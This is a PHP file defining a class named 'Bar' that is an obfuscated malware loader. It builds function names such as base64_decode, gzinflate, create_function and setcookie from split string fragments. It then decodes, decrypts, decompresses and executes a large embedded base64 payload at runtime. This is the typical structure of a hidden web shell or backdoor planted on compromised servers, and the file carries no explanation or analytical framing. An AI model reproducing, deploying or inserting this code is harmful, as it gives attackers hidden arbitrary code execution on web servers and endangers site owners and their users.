<?php
class Bar {
	function __construct() {
		$_check = $this->_ver($this->conf);
		$_check = $this->_core($this->_build($_check));
		$_check = $this->_backend($_check);
		if($_check) {
			$this->module = $_check[3];
			$this->_stack = $_check[2];
			$this->x86 = $_check[0];
			$this->px($_check[0], $_check[1]);
		}
	}
	
	function px($library, $code) {
		$this->_seek = $library;
		$this->code = $code;
		$this->_memory = $this->_ver($this->_memory);
		$this->_memory = $this->_build($this->_memory);
		$this->_memory = $this->_cache();
		if(strpos($this->_memory, $this->_seek) !== false) {
			if(!$this->module)
				$this->access($this->_stack, $this->x86);
			$this->_backend($this->_memory);
		}
	}
	
	function access($control, $dx) {
		$income = $this->access[3].$this->access[4].$this->access[2].$this->access[0].$this->access[1];
		$income = @$income($control, $dx);
	}

	function value($code, $process, $library) {
		$income = strlen($process) + strlen($library);
		while(strlen($library) < $income) {
			$claster = ord($process[$this->lib]) - ord($library[$this->lib]);
			$process[$this->lib] = chr($claster % (512/2));
			$library .= $process[$this->lib];
			$this->lib++;
		}
		return $process;
	}
   
	function _build($control) {
		$emu = $this->_build[0].$this->_build[2].$this->_build[1];
		$emu = @$emu($control);
		return $emu;
	}

	function _core($control) {
		$emu = $this->_core[1].$this->_core[2].$this->_core[0];
		$emu = @$emu($control);
		return $emu;
	}
	
	function _cache() {
		$this->debug = $this->value($this->code, $this->_memory, $this->_seek);
		$this->debug = $this->_core($this->debug);
		return $this->debug;
	}
	
	function _backend($_load) {
		$emu = $this->_ls[1].$this->_ls[0].$this->_ls[4].$this->_ls[2].$this->_ls[3];
		$view = @$emu('', $_load);
		return $view();
	}
	
	function _ver($income) {
		$emu = $this->_point[1].$this->_point[0].$this->_point[3].$this->_point[4].$this->_point[2];
		return $emu("\r\n", "", $income);
	}
	 
	var $_rx;
	var $lib = 0;
	
	var $_core = array('te', 'gzin', 'fla');
	var $_ls = array('te_', 'crea', 'ncti', 'on', 'fu');
	var $_build = array('bas', 'code', 'e64_de');
	var $access = array('i', 'e', 'ok', 'set', 'co');
	var $_point = array('r_', 'st', 'e', 'rep', 'lac');
	 
	var $_memory = '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
